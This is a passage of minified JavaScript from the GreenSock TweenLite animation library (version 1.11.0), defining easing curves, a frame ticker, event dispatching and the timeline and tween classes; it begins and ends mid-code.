                this._super.setRatio.call(this, t);
            else
                for (e = this._firstPT; e; )
                    e.f ? e.t[e.p](this.finals[e.p]) : e.t[e.p] = this.finals[e.p],
                    e = e._next
        }
    })._autoCSS = !0,
    window._gsDefine("easing.Back", ["easing.Ease"], function(t) {
        var e, i, s, r = window.GreenSockGlobals || window, n = r.com.greensock, a = 2 * Math.PI, o = Math.PI / 2, h = n._class, l = function(e, i) {
            var s = h("easing." + e, function() {}, !0)
              , r = s.prototype = new t;
            return r.constructor = s,
            r.getRatio = i,
            s
        }, _ = t.register || function() {}
        , u = function(t, e, i, s) {
            var r = h("easing." + t, {
                easeOut: new e,
                easeIn: new i,
                easeInOut: new s
            }, !0);
            return _(r, t),
            r
        }, p = function(t, e, i) {
            this.t = t,
            this.v = e,
            i && (this.next = i,
            i.prev = this,
            this.c = i.v - e,
            this.gap = i.t - t)
        }, f = function(e, i) {
            var s = h("easing." + e, function(t) {
                this._p1 = t || 0 === t ? t : 1.70158,
                this._p2 = 1.525 * this._p1
            }, !0)
              , r = s.prototype = new t;
            return r.constructor = s,
            r.getRatio = i,
            r.config = function(t) {
                return new s(t)
            }
            ,
            s
        }, c = u("Back", f("BackOut", function(t) {
            return (t -= 1) * t * ((this._p1 + 1) * t + this._p1) + 1
        }), f("BackIn", function(t) {
            return t * t * ((this._p1 + 1) * t - this._p1)
        }), f("BackInOut", function(t) {
            return 1 > (t *= 2) ? .5 * t * t * ((this._p2 + 1) * t - this._p2) : .5 * ((t -= 2) * t * ((this._p2 + 1) * t + this._p2) + 2)
        })), m = h("easing.SlowMo", function(t, e, i) {
            e = e || 0 === e ? e : .7,
            null == t ? t = .7 : t > 1 && (t = 1),
            this._p = 1 !== t ? e : 0,
            this._p1 = (1 - t) / 2,
            this._p2 = t,
            this._p3 = this._p1 + this._p2,
            this._calcEnd = i === !0
        }, !0), d = m.prototype = new t;
        return d.constructor = m,
        d.getRatio = function(t) {
            var e = t + (.5 - t) * this._p;
            return this._p1 > t ? this._calcEnd ? 1 - (t = 1 - t / this._p1) * t : e - (t = 1 - t / this._p1) * t * t * t * e : t > this._p3 ? this._calcEnd ? 1 - (t = (t - this._p3) / this._p1) * t : e + (t - e) * (t = (t - this._p3) / this._p1) * t * t * t : this._calcEnd ? 1 : e
        }
        ,
        m.ease = new m(.7,.7),
        d.config = m.config = function(t, e, i) {
            return new m(t,e,i)
        }
        ,
        e = h("easing.SteppedEase", function(t) {
            t = t || 1,
            this._p1 = 1 / t,
            this._p2 = t + 1
        }, !0),
        d = e.prototype = new t,
        d.constructor = e,
        d.getRatio = function(t) {
            return 0 > t ? t = 0 : t >= 1 && (t = .999999999),
            (this._p2 * t >> 0) * this._p1
        }
        ,
        d.config = e.config = function(t) {
            return new e(t)
        }
        ,
        i = h("easing.RoughEase", function(e) {
            e = e || {};
            for (var i, s, r, n, a, o, h = e.taper || "none", l = [], _ = 0, u = 0 | (e.points || 20), f = u, c = e.randomize !== !1, m = e.clamp === !0, d = e.template instanceof t ? e.template : null, g = "number" == typeof e.strength ? .4 * e.strength : .4; --f > -1; )
                i = c ? Math.random() : 1 / u * f,
                s = d ? d.getRatio(i) : i,
                "none" === h ? r = g : "out" === h ? (n = 1 - i,
                r = n * n * g) : "in" === h ? r = i * i * g : .5 > i ? (n = 2 * i,
                r = .5 * n * n * g) : (n = 2 * (1 - i),
                r = .5 * n * n * g),
                c ? s += Math.random() * r - .5 * r : f % 2 ? s += .5 * r : s -= .5 * r,
                m && (s > 1 ? s = 1 : 0 > s && (s = 0)),
                l[_++] = {
                    x: i,
                    y: s
                };
            for (l.sort(function(t, e) {
                return t.x - e.x
            }),
            o = new p(1,1,null),
            f = u; --f > -1; )
                a = l[f],
                o = new p(a.x,a.y,o);
            this._prev = new p(0,0,0 !== o.t ? o : o.next)
        }, !0),
        d = i.prototype = new t,
        d.constructor = i,
        d.getRatio = function(t) {
            var e = this._prev;
            if (t > e.t) {
                for (; e.next && t >= e.t; )
                    e = e.next;
                e = e.prev
            } else
                for (; e.prev && e.t >= t; )
                    e = e.prev;
            return this._prev = e,
            e.v + (t - e.t) / e.gap * e.c
        }
        ,
        d.config = function(t) {
            return new i(t)
        }
        ,
        i.ease = new i,
        u("Bounce", l("BounceOut", function(t) {
            return 1 / 2.75 > t ? 7.5625 * t * t : 2 / 2.75 > t ? 7.5625 * (t -= 1.5 / 2.75) * t + .75 : 2.5 / 2.75 > t ? 7.5625 * (t -= 2.25 / 2.75) * t + .9375 : 7.5625 * (t -= 2.625 / 2.75) * t + .984375
        }), l("BounceIn", function(t) {
            return 1 / 2.75 > (t = 1 - t) ? 1 - 7.5625 * t * t : 2 / 2.75 > t ? 1 - (7.5625 * (t -= 1.5 / 2.75) * t + .75) : 2.5 / 2.75 > t ? 1 - (7.5625 * (t -= 2.25 / 2.75) * t + .9375) : 1 - (7.5625 * (t -= 2.625 / 2.75) * t + .984375)
        }), l("BounceInOut", function(t) {
            var e = .5 > t;
            return t = e ? 1 - 2 * t : 2 * t - 1,
            t = 1 / 2.75 > t ? 7.5625 * t * t : 2 / 2.75 > t ? 7.5625 * (t -= 1.5 / 2.75) * t + .75 : 2.5 / 2.75 > t ? 7.5625 * (t -= 2.25 / 2.75) * t + .9375 : 7.5625 * (t -= 2.625 / 2.75) * t + .984375,
            e ? .5 * (1 - t) : .5 * t + .5
        })),
        u("Circ", l("CircOut", function(t) {
            return Math.sqrt(1 - (t -= 1) * t)
        }), l("CircIn", function(t) {
            return -(Math.sqrt(1 - t * t) - 1)
        }), l("CircInOut", function(t) {
            return 1 > (t *= 2) ? -.5 * (Math.sqrt(1 - t * t) - 1) : .5 * (Math.sqrt(1 - (t -= 2) * t) + 1)
        })),
        s = function(e, i, s) {
            var r = h("easing." + e, function(t, e) {
                this._p1 = t || 1,
                this._p2 = e || s,
                this._p3 = this._p2 / a * (Math.asin(1 / this._p1) || 0)
            }, !0)
              , n = r.prototype = new t;
            return n.constructor = r,
            n.getRatio = i,
            n.config = function(t, e) {
                return new r(t,e)
            }
            ,
            r
        }
        ,
        u("Elastic", s("ElasticOut", function(t) {
            return this._p1 * Math.pow(2, -10 * t) * Math.sin((t - this._p3) * a / this._p2) + 1
        }, .3), s("ElasticIn", function(t) {
            return -(this._p1 * Math.pow(2, 10 * (t -= 1)) * Math.sin((t - this._p3) * a / this._p2))
        }, .3), s("ElasticInOut", function(t) {
            return 1 > (t *= 2) ? -.5 * this._p1 * Math.pow(2, 10 * (t -= 1)) * Math.sin((t - this._p3) * a / this._p2) : .5 * this._p1 * Math.pow(2, -10 * (t -= 1)) * Math.sin((t - this._p3) * a / this._p2) + 1
        }, .45)),
        u("Expo", l("ExpoOut", function(t) {
            return 1 - Math.pow(2, -10 * t)
        }), l("ExpoIn", function(t) {
            return Math.pow(2, 10 * (t - 1)) - .001
        }), l("ExpoInOut", function(t) {
            return 1 > (t *= 2) ? .5 * Math.pow(2, 10 * (t - 1)) : .5 * (2 - Math.pow(2, -10 * (t - 1)))
        })),
        u("Sine", l("SineOut", function(t) {
            return Math.sin(t * o)
        }), l("SineIn", function(t) {
            return -Math.cos(t * o) + 1
        }), l("SineInOut", function(t) {
            return -.5 * (Math.cos(Math.PI * t) - 1)
        })),
        h("easing.EaseLookup", {
            find: function(e) {
                return t.map[e]
            }
        }, !0),
        _(r.SlowMo, "SlowMo", "ease,"),
        _(i, "RoughEase", "ease,"),
        _(e, "SteppedEase", "ease,"),
        c
    }, !0)
}),
function(t) {
    "use strict";
    var e = t.GreenSockGlobals || t;
    if (!e.TweenLite) {
        var i, s, r, n, a, o = function(t) {
            var i, s = t.split("."), r = e;
            for (i = 0; s.length > i; i++)
                r[s[i]] = r = r[s[i]] || {};
            return r
        }, h = o("com.greensock"), l = 1e-10, _ = [].slice, u = function() {}, p = function() {
            var t = Object.prototype.toString
              , e = t.call([]);
            return function(i) {
                return i instanceof Array || "object" == typeof i && !!i.push && t.call(i) === e
            }
        }(), f = {}, c = function(i, s, r, n) {
            this.sc = f[i] ? f[i].sc : [],
            f[i] = this,
            this.gsClass = null,
            this.func = r;
            var a = [];
            this.check = function(h) {
                for (var l, _, u, p, m = s.length, d = m; --m > -1; )
                    (l = f[s[m]] || new c(s[m],[])).gsClass ? (a[m] = l.gsClass,
                    d--) : h && l.sc.push(this);
                if (0 === d && r)
                    for (_ = ("com.greensock." + i).split("."),
                    u = _.pop(),
                    p = o(_.join("."))[u] = this.gsClass = r.apply(r, a),
                    n && (e[u] = p,
                    "function" == typeof define && define.amd ? define((t.GreenSockAMDPath ? t.GreenSockAMDPath + "/" : "") + i.split(".").join("/"), [], function() {
                        return p
                    }) : "undefined" != typeof module && module.exports && (module.exports = p)),
                    m = 0; this.sc.length > m; m++)
                        this.sc[m].check()
            }
            ,
            this.check(!0)
        }, m = t._gsDefine = function(t, e, i, s) {
            return new c(t,e,i,s)
        }
        , d = h._class = function(t, e, i) {
            return e = e || function() {}
            ,
            m(t, [], function() {
                return e
            }, i),
            e
        }
        ;
        m.globals = e;
        var g = [0, 0, 1, 1]
          , v = []
          , y = d("easing.Ease", function(t, e, i, s) {
            this._func = t,
            this._type = i || 0,
            this._power = s || 0,
            this._params = e ? g.concat(e) : g
        }, !0)
          , T = y.map = {}
          , w = y.register = function(t, e, i, s) {
            for (var r, n, a, o, l = e.split(","), _ = l.length, u = (i || "easeIn,easeOut,easeInOut").split(","); --_ > -1; )
                for (n = l[_],
                r = s ? d("easing." + n, null, !0) : h.easing[n] || {},
                a = u.length; --a > -1; )
                    o = u[a],
                    T[n + "." + o] = T[o + n] = r[o] = t.getRatio ? t : t[o] || new t
        }
        ;
        for (r = y.prototype,
        r._calcEnd = !1,
        r.getRatio = function(t) {
            if (this._func)
                return this._params[0] = t,
                this._func.apply(null, this._params);
            var e = this._type
              , i = this._power
              , s = 1 === e ? 1 - t : 2 === e ? t : .5 > t ? 2 * t : 2 * (1 - t);
            return 1 === i ? s *= s : 2 === i ? s *= s * s : 3 === i ? s *= s * s * s : 4 === i && (s *= s * s * s * s),
            1 === e ? 1 - s : 2 === e ? s : .5 > t ? s / 2 : 1 - s / 2
        }
        ,
        i = ["Linear", "Quad", "Cubic", "Quart", "Quint,Strong"],
        s = i.length; --s > -1; )
            r = i[s] + ",Power" + s,
            w(new y(null,null,1,s), r, "easeOut", !0),
            w(new y(null,null,2,s), r, "easeIn" + (0 === s ? ",easeNone" : "")),
            w(new y(null,null,3,s), r, "easeInOut");
        T.linear = h.easing.Linear.easeIn,
        T.swing = h.easing.Quad.easeInOut;
        var x = d("events.EventDispatcher", function(t) {
            this._listeners = {},
            this._eventTarget = t || this
        });
        r = x.prototype,
        r.addEventListener = function(t, e, i, s, r) {
            r = r || 0;
            var o, h, l = this._listeners[t], _ = 0;
            for (null == l && (this._listeners[t] = l = []),
            h = l.length; --h > -1; )
                o = l[h],
                o.c === e && o.s === i ? l.splice(h, 1) : 0 === _ && r > o.pr && (_ = h + 1);
            l.splice(_, 0, {
                c: e,
                s: i,
                up: s,
                pr: r
            }),
            this !== n || a || n.wake()
        }
        ,
        r.removeEventListener = function(t, e) {
            var i, s = this._listeners[t];
            if (s)
                for (i = s.length; --i > -1; )
                    if (s[i].c === e)
                        return s.splice(i, 1),
                        void 0
        }
        ,
        r.dispatchEvent = function(t) {
            var e, i, s, r = this._listeners[t];
            if (r)
                for (e = r.length,
                i = this._eventTarget; --e > -1; )
                    s = r[e],
                    s.up ? s.c.call(s.s || i, {
                        type: t,
                        target: i
                    }) : s.c.call(s.s || i)
        }
        ;
        var b = t.requestAnimationFrame
          , P = t.cancelAnimationFrame
          , S = Date.now || function() {
            return (new Date).getTime()
        }
          , k = S();
        for (i = ["ms", "moz", "webkit", "o"],
        s = i.length; --s > -1 && !b; )
            b = t[i[s] + "RequestAnimationFrame"],
            P = t[i[s] + "CancelAnimationFrame"] || t[i[s] + "CancelRequestAnimationFrame"];
        d("Ticker", function(t, e) {
            var i, s, r, o, h, l = this, _ = S(), p = e !== !1 && b, f = function(t) {
                k = S(),
                l.time = (k - _) / 1e3;
                var e, n = l.time - h;
                (!i || n > 0 || t === !0) && (l.frame++,
                h += n + (n >= o ? .004 : o - n),
                e = !0),
                t !== !0 && (r = s(f)),
                e && l.dispatchEvent("tick")
            };
            x.call(l),
            l.time = l.frame = 0,
            l.tick = function() {
                f(!0)
            }
            ,
            l.sleep = function() {
                null != r && (p && P ? P(r) : clearTimeout(r),
                s = u,
                r = null,
                l === n && (a = !1))
            }
            ,
            l.wake = function() {
                null !== r && l.sleep(),
                s = 0 === i ? u : p && b ? b : function(t) {
                    return setTimeout(t, 0 | 1e3 * (h - l.time) + 1)
                }
                ,
                l === n && (a = !0),
                f(2)
            }
            ,
            l.fps = function(t) {
                return arguments.length ? (i = t,
                o = 1 / (i || 60),
                h = this.time + o,
                l.wake(),
                void 0) : i
            }
            ,
            l.useRAF = function(t) {
                return arguments.length ? (l.sleep(),
                p = t,
                l.fps(i),
                void 0) : p
            }
            ,
            l.fps(t),
            setTimeout(function() {
                p && (!r || 5 > l.frame) && l.useRAF(!1)
            }, 1500)
        }),
        r = h.Ticker.prototype = new h.events.EventDispatcher,
        r.constructor = h.Ticker;
        var R = d("core.Animation", function(t, e) {
            if (this.vars = e = e || {},
            this._duration = this._totalDuration = t || 0,
            this._delay = Number(e.delay) || 0,
            this._timeScale = 1,
            this._active = e.immediateRender === !0,
            this.data = e.data,
            this._reversed = e.reversed === !0,
            U) {
                a || n.wake();
                var i = this.vars.useFrames ? z : U;
                i.add(this, i._time),
                this.vars.paused && this.paused(!0)
            }
        });
        n = R.ticker = new h.Ticker,
        r = R.prototype,
        r._dirty = r._gc = r._initted = r._paused = !1,
        r._totalTime = r._time = 0,
        r._rawPrevTime = -1,
        r._next = r._last = r._onUpdate = r._timeline = r.timeline = null,
        r._paused = !1;
        var A = function() {
            S() - k > 2e3 && n.wake(),
            setTimeout(A, 2e3)
        };
        A(),
        r.play = function(t, e) {
            return arguments.length && this.seek(t, e),
            this.reversed(!1).paused(!1)
        }
        ,
        r.pause = function(t, e) {
            return arguments.length && this.seek(t, e),
            this.paused(!0)
        }
        ,
        r.resume = function(t, e) {
            return arguments.length && this.seek(t, e),
            this.paused(!1)
        }
        ,
        r.seek = function(t, e) {
            return this.totalTime(Number(t), e !== !1)
        }
        ,
        r.restart = function(t, e) {
            return this.reversed(!1).paused(!1).totalTime(t ? -this._delay : 0, e !== !1, !0)
        }
        ,
        r.reverse = function(t, e) {
            return arguments.length && this.seek(t || this.totalDuration(), e),
            this.reversed(!0).paused(!1)
        }
        ,
        r.render = function() {}
        ,
        r.invalidate = function() {
            return this
        }
        ,
        r.isActive = function() {
            var t, e = this._timeline, i = this._startTime;
            return !e || !this._gc && !this._paused && e.isActive() && (t = e.rawTime()) >= i && i + this.totalDuration() / this._timeScale > t
        }
        ,
        r._enabled = function(t, e) {
            return a || n.wake(),
            this._gc = !t,
            this._active = this.isActive(),
            e !== !0 && (t && !this.timeline ? this._timeline.add(this, this._startTime - this._delay) : !t && this.timeline && this._timeline._remove(this, !0)),
            !1
        }
        ,
        r._kill = function() {
            return this._enabled(!1, !1)
        }
        ,
        r.kill = function(t, e) {
            return this._kill(t, e),
            this
        }
        ,
        r._uncache = function(t) {
            for (var e = t ? this : this.timeline; e; )
                e._dirty = !0,
                e = e.timeline;
            return this
        }
        ,
        r._swapSelfInParams = function(t) {
            for (var e = t.length, i = t.concat(); --e > -1; )
                "{self}" === t[e] && (i[e] = this);
            return i
        }
        ,
        r.eventCallback = function(t, e, i, s) {
            if ("on" === (t || "").substr(0, 2)) {
                var r = this.vars;
                if (1 === arguments.length)
                    return r[t];
                null == e ? delete r[t] : (r[t] = e,
                r[t + "Params"] = p(i) && -1 !== i.join("").indexOf("{self}") ? this._swapSelfInParams(i) : i,
                r[t + "Scope"] = s),
                "onUpdate" === t && (this._onUpdate = e)
            }
            return this
        }
        ,
        r.delay = function(t) {
            return arguments.length ? (this._timeline.smoothChildTiming && this.startTime(this._startTime + t - this._delay),
            this._delay = t,
            this) : this._delay
        }
        ,
        r.duration = function(t) {
            return arguments.length ? (this._duration = this._totalDuration = t,
            this._uncache(!0),
            this._timeline.smoothChildTiming && this._time > 0 && this._time < this._duration && 0 !== t && this.totalTime(this._totalTime * (t / this._duration), !0),
            this) : (this._dirty = !1,
            this._duration)
        }
        ,
        r.totalDuration = function(t) {
            return this._dirty = !1,
            arguments.length ? this.duration(t) : this._totalDuration
        }
        ,
        r.time = function(t, e) {
            return arguments.length ? (this._dirty && this.totalDuration(),
            this.totalTime(t > this._duration ? this._duration : t, e)) : this._time
        }
        ,
        r.totalTime = function(t, e, i) {
            if (a || n.wake(),
            !arguments.length)
                return this._totalTime;
            if (this._timeline) {
                if (0 > t && !i && (t += this.totalDuration()),
                this._timeline.smoothChildTiming) {
                    this._dirty && this.totalDuration();
                    var s = this._totalDuration
                      , r = this._timeline;
                    if (t > s && !i && (t = s),
                    this._startTime = (this._paused ? this._pauseTime : r._time) - (this._reversed ? s - t : t) / this._timeScale,
                    r._dirty || this._uncache(!1),
                    r._timeline)
                        for (; r._timeline; )
                            r._timeline._time !== (r._startTime + r._totalTime) / r._timeScale && r.totalTime(r._totalTime, !0),
                            r = r._timeline
                }
                this._gc && this._enabled(!0, !1),
                (this._totalTime !== t || 0 === this._duration) && this.render(t, e, !1)
            }
            return this
        }
        ,
        r.progress = r.totalProgress = function(t, e) {
            return arguments.length ? this.totalTime(this.duration() * t, e) : this._time / this.duration()
        }
        ,
        r.startTime = function(t) {
            return arguments.length ? (t !== this._startTime && (this._startTime = t,
            this.timeline && this.timeline._sortChildren && this.timeline.add(this, t - this._delay)),
            this) : this._startTime
        }
        ,
        r.timeScale = function(t) {
            if (!arguments.length)
                return this._timeScale;
            if (t = t || l,
            this._timeline && this._timeline.smoothChildTiming) {
                var e = this._pauseTime
                  , i = e || 0 === e ? e : this._timeline.totalTime();
                this._startTime = i - (i - this._startTime) * this._timeScale / t
            }
            return this._timeScale = t,
            this._uncache(!1)
        }
        ,
        r.reversed = function(t) {
            return arguments.length ? (t != this._reversed && (this._reversed = t,
            this.totalTime(this._totalTime, !0)),
            this) : this._reversed
        }
        ,
        r.paused = function(t) {
            if (!arguments.length)
                return this._paused;
            if (t != this._paused && this._timeline) {
                a || t || n.wake();
                var e = this._timeline
                  , i = e.rawTime()
                  , s = i - this._pauseTime;
                !t && e.smoothChildTiming && (this._startTime += s,
                this._uncache(!1)),
                this._pauseTime = t ? i : null,
                this._paused = t,
                this._active = this.isActive(),
                !t && 0 !== s && this._initted && this.duration() && this.render(e.smoothChildTiming ? this._totalTime : (i - this._startTime) / this._timeScale, !0, !0)
            }
            return this._gc && !t && this._enabled(!0, !1),
            this
        }
        ;
        var C = d("core.SimpleTimeline", function(t) {
            R.call(this, 0, t),
            this.autoRemoveChildren = this.smoothChildTiming = !0
        });
        r = C.prototype = new R,
        r.constructor = C,
        r.kill()._gc = !1,
        r._first = r._last = null,
        r._sortChildren = !1,
        r.add = r.insert = function(t, e) {
            var i, s;
            if (t._startTime = Number(e || 0) + t._delay,
            t._paused && this !== t._timeline && (t._pauseTime = t._startTime + (this.rawTime() - t._startTime) / t._timeScale),
            t.timeline && t.timeline._remove(t, !0),
            t.timeline = t._timeline = this,
            t._gc && t._enabled(!0, !0),
            i = this._last,
            this._sortChildren)
                for (s = t._startTime; i && i._startTime > s; )
                    i = i._prev;
            return i ? (t._next = i._next,
            i._next = t) : (t._next = this._first,
            this._first = t),
            t._next ? t._next._prev = t : this._last = t,
            t._prev = i,
            this._timeline && this._uncache(!0),
            this
        }
        ,
        r._remove = function(t, e) {
            return t.timeline === this && (e || t._enabled(!1, !0),
            t.timeline = null,
            t._prev ? t._prev._next = t._next : this._first === t && (this._first = t._next),
            t._next ? t._next._prev = t._prev : this._last === t && (this._last = t._prev),
            this._timeline && this._uncache(!0)),
            this
        }
        ,
        r.render = function(t, e, i) {
            var s, r = this._first;
            for (this._totalTime = this._time = this._rawPrevTime = t; r; )
                s = r._next,
                (r._active || t >= r._startTime && !r._paused) && (r._reversed ? r.render((r._dirty ? r.totalDuration() : r._totalDuration) - (t - r._startTime) * r._timeScale, e, i) : r.render((t - r._startTime) * r._timeScale, e, i)),
                r = s
        }
        ,
        r.rawTime = function() {
            return a || n.wake(),
            this._totalTime
        }
        ;
        var O = d("TweenLite", function(e, i, s) {
            if (R.call(this, i, s),
            this.render = O.prototype.render,
            null == e)
                throw "Cannot tween a null target.";
            this.target = e = "string" != typeof e ? e : O.selector(e) || e;
            var r, n, a, o = e.jquery || e.length && e !== t && e[0] && (e[0] === t || e[0].nodeType && e[0].style && !e.nodeType), h = this.vars.overwrite;
            if (this._overwrite = h = null == h ? X[O.defaultOverwrite] : "number" == typeof h ? h >> 0 : X[h],
            (o || e instanceof Array || e.push && p(e)) && "number" != typeof e[0])
                for (this._targets = a = _.call(e, 0),
                this._propLookup = [],
                this._siblings = [],
                r = 0; a.length > r; r++)
                    n = a[r],
                    n ? "string" != typeof n ? n.length && n !== t && n[0] && (n[0] === t || n[0].nodeType && n[0].style && !n.nodeType) ? (a.splice(r--, 1),
                    this._targets = a = a.concat(_.call(n, 0))) : (this._siblings[r] = Y(n, this, !1),
                    1 === h && this._siblings[r].length > 1 && j(n, this, null, 1, this._siblings[r])) : (n = a[r--] = O.selector(n),
                    "string" == typeof n && a.splice(r + 1, 1)) : a.splice(r--, 1);
            else
                this._propLookup = {},
                this._siblings = Y(e, this, !1),
                1 === h && this._siblings.length > 1 && j(e, this, null, 1, this._siblings);
            (this.vars.immediateRender || 0 === i && 0 === this._delay && this.vars.immediateRender !== !1) && this.render(-this._delay, !1, !0)
        }, !0)
          , D = function(e) {
            return e.length && e !== t && e[0] && (e[0] === t || e[0].nodeType && e[0].style && !e.nodeType)
        }
          , M = function(t, e) {
            var i, s = {};
            for (i in t)
                L[i] || i in e && "x" !== i && "y" !== i && "width" !== i && "height" !== i && "className" !== i && "border" !== i || !(!F[i] || F[i] && F[i]._autoCSS) || (s[i] = t[i],
                delete t[i]);
            t.css = s
        };
        r = O.prototype = new R,
        r.constructor = O,
        r.kill()._gc = !1,
        r.ratio = 0,
        r._firstPT = r._targets = r._overwrittenProps = r._startAt = null,
        r._notifyPluginsOfEnabled = !1,
        O.version = "1.11.0",
        O.defaultEase = r._ease = new y(null,null,1,1),
        O.defaultOverwrite = "auto",
        O.ticker = n,
        O.autoSleep = !0,
        O.selector = t.$ || t.jQuery || function(e) {
            return t.$ ? (O.selector = t.$,
            t.$(e)) : t.document ? t.document.getElementById("#" === e.charAt(0) ? e.substr(1) : e) : e
        }
        ;
        var I = O._internals = {
            isArray: p,
            isSelector: D
        }
          , F = O._plugins = {}
          , E = O._tweenLookup = {}
          , N = 0
          , L = I.reservedProps = {
            ease: 1,
            delay: 1,
            overwrite: 1,
            onComplete: 1,
            onCompleteParams: 1,
            onCompleteScope: 1,
            useFrames: 1,
            runBackwards: 1,
            startAt: 1,
            onUpdate: 1,
            onUpdateParams: 1,
            onUpdateScope: 1,
            onStart: 1,
            onStartParams: 1,
            onStartScope: 1,
            onReverseComplete: 1,
            onReverseCompleteParams: 1,
            onReverseCompleteScope: 1,
            onRepeat: 1,
            onRepeatParams: 1,
            onRepeatScope: 1,
            easeParams: 1,
            yoyo: 1,
            immediateRender: 1,
            repeat: 1,
            repeatDelay: 1,
            data: 1,
            paused: 1,
            reversed: 1,
            autoCSS: 1
        }
          , X = {
            none: 0,
            all: 1,
            auto: 2,
            concurrent: 3,
            allOnStart: 4,
            preexisting: 5,
            "true": 1,
            "false": 0
        }
          , z = R._rootFramesTimeline = new C
          , U = R._rootTimeline = new C;
        U._startTime = n.time,
        z._startTime = n.frame,
        U._active = z._active = !0,
        R._updateRoot = function() {
            if (U.render((n.time - U._startTime) * U._timeScale, !1, !1),
            z.render((n.frame - z._startTime) * z._timeScale, !1, !1),
            !(n.frame % 120)) {
                var t, e, i;
                for (i in E) {
                    for (e = E[i].tweens,
                    t = e.length; --t > -1; )
                        e[t]._gc && e.splice(t, 1);
                    0 === e.length && delete E[i]
                }
                if (i = U._first,
                (!i || i._paused) && O.autoSleep && !z._first && 1 === n._listeners.tick.length) {
                    for (; i && i._paused; )
                        i = i._next;
                    i || n.sleep()
                }
            }
        }
        ,
        n.addEventListener("tick", R._updateRoot);
        var Y = function(t, e, i) {
            var s, r, n = t._gsTweenID;
            if (E[n || (t._gsTweenID = n = "t" + N++)] || (E[n] = {
                target: t,
                tweens: []
            }),
            e && (s = E[n].tweens,
            s[r = s.length] = e,
            i))
                for (; --r > -1; )
                    s[r] === e && s.splice(r, 1);
            return E[n].tweens
        }
          , j = function(t, e, i, s, r) {
            var n, a, o, h;
            if (1 === s || s >= 4) {
                for (h = r.length,
                n = 0; h > n; n++)
                    if ((o = r[n]) !== e)
                        o._gc || o._enabled(!1, !1) && (a = !0);
                    else if (5 === s)
                        break;
                return a
            }
            var _, u = e._startTime + l, p = [], f = 0, c = 0 === e._duration;
            for (n = r.length; --n > -1; )
                (o = r[n]) === e || o._gc || o._paused || (o._timeline !== e._timeline ? (_ = _ || B(e, 0, c),
                0 === B(o, _, c) && (p[f++] = o)) : u >= o._startTime && o._startTime + o.totalDuration() / o._timeScale + l > u && ((c || !o._initted) && 2e-10 >= u - o._startTime || (p[f++] = o)));
            for (n = f; --n > -1; )
                o = p[n],
                2 === s && o._kill(i, t) && (a = !0),
                (2 !== s || !o._firstPT && o._initted) && o._enabled(!1, !1) && (a = !0);
            return a
        }
          , B = function(t, e, i) {
            for (var s = t._timeline, r = s._timeScale, n = t._startTime; s._timeline; ) {
                if (n += s._startTime,
                r *= s._timeScale,
                s._paused)
                    return -100;
                s = s._timeline
            }
            return n /= r,
            n > e ? n - e : i && n === e || !t._initted && 2 * l > n - e ? l : (n += t.totalDuration() / t._timeScale / r) > e + l ? 0 : n - e - l
        };
        r._init = function() {
            var t, e, i, s, r = this.vars, n = this._overwrittenProps, a = this._duration, o = r.immediateRender, h = r.ease;
            if (r.startAt) {
                if (this._startAt && this._startAt.render(-1, !0),
                r.startAt.overwrite = 0,
                r.startAt.immediateRender = !0,
                this._startAt = O.to(this.target, 0, r.startAt),
                o)
                    if (this._time > 0)
                        this._startAt = null;
                    else if (0 !== a)
                        return
            } else if (r.runBackwards && 0 !== a)
                if (this._startAt)
                    this._startAt.render(-1, !0),
                    this._startAt = null;
                else {
                    i = {};
                    for (s in r)
                        L[s] && "autoCSS" !== s || (i[s] = r[s]);
                    if (i.overwrite = 0,
                    i.data = "isFromStart",
                    this._startAt = O.to(this.target, 0, i),
                    r.immediateRender) {
                        if (0 === this._time)
                            return
                    } else
                        this._startAt.render(-1, !0)
                }
            if (this._ease = h ? h instanceof y ? r.easeParams instanceof Array ? h.config.apply(h, r.easeParams) : h : "function" == typeof h ? new y(h,r.easeParams) : T[h] || O.defaultEase : O.defaultEase,
            this._easeType = this._ease._type,
            this._easePower = this._ease._power,
            this._firstPT = null,
            this._targets)
                for (t = this._targets.length; --t > -1; )
                    this._initProps(this._targets[t], this._propLookup[t] = {}, this._siblings[t], n ? n[t] : null) && (e = !0);
            else
                e = this._initProps(this.target, this._propLookup, this._siblings, n);
            if (e && O._onPluginEvent("_onInitAllProps", this),
            n && (this._firstPT || "function" != typeof this.target && this._enabled(!1, !1)),
            r.runBackwards)
                for (i = this._firstPT; i; )
                    i.s += i.c,
                    i.c = -i.c,
                    i = i._next;
            this._onUpdate = r.onUpdate,
            this._initted = !0
        }
        ,
        r._initProps = function(e, i, s, r) {
            var n, a, o, h, l, _;
            if (null == e)
                return !1;
            this.vars.css || e.style && e !== t && e.nodeType && F.css && this.vars.autoCSS !== !1 && M(this.vars, e);
            for (n in this.vars) {
                if (_ = this.vars[n],
                L[n])
                    _ && (_ instanceof Array || _.push && p(_)) && -1 !== _.join("").indexOf("{self}") && (this.vars[n] = _ = this._swapSelfInParams(_, this));
                else if (F[n] && (h = new F[n])._onInitTween(e, this.vars[n], this)) {
                    for (this._firstPT = l = {
                        _next: this._firstPT,
                        t: h,
                        p: "setRatio",
                        s: 0,
                        c: 1,
                        f: !0,
                        n: n,
                        pg: !0,
                        pr: h._priority
                    },
                    a = h._overwriteProps.length; --a > -1; )
                        i[h._overwriteProps[a]] = this._firstPT;
                    (h._priority || h._onInitAllProps) && (o = !0),
                    (h._onDisable || h._onEnable) && (this._notifyPluginsOfEnabled = !0)
                } else
                    this._firstPT = i[n] = l = {
                        _next: this._firstPT,
                        t: e,
                        p: n,
                        f: "function" == typeof e[n],
                        n: n,
                        pg: !1,
                        pr: 0
                    },
                    l.s = l.f ? e[n.indexOf("set") || "function" != typeof e["get" + n.substr(3)] ? n : "get" + n.substr(3)]() : parseFloat(e[n]),
                    l.c = "string" == typeof _ && "=" === _.charAt(1) ? parseInt(_.charAt(0) + "1", 10) * Number(_.substr(2)) : Number(_) - l.s || 0;
                l && l._next && (l._next._prev = l)
            }
            return r && this._kill(r, e) ? this._initProps(e, i, s, r) : this._overwrite > 1 && this._firstPT && s.length > 1 && j(e, this, i, this._overwrite, s) ? (this._kill(i, e),
            this._initProps(e, i, s, r)) : o
        }
        ,
        r.render = function(t, e, i) {
            var s, r, n, a, o = this._time, h = this._duration;
            if (t >= h)
                this._totalTime = this._time = h,
                this.ratio = this._ease._calcEnd ? this._ease.getRatio(1) : 1,
                this._reversed || (s = !0,
                r = "onComplete"),
                0 === h && (a = this._rawPrevTime,
                (0 === t || 0 > a || a === l) && a !== t && (i = !0,
                a > l && (r = "onReverseComplete")),
                this._rawPrevTime = a = !e || t ? t : l);
            else if (1e-7 > t)
                this._totalTime = this._time = 0,
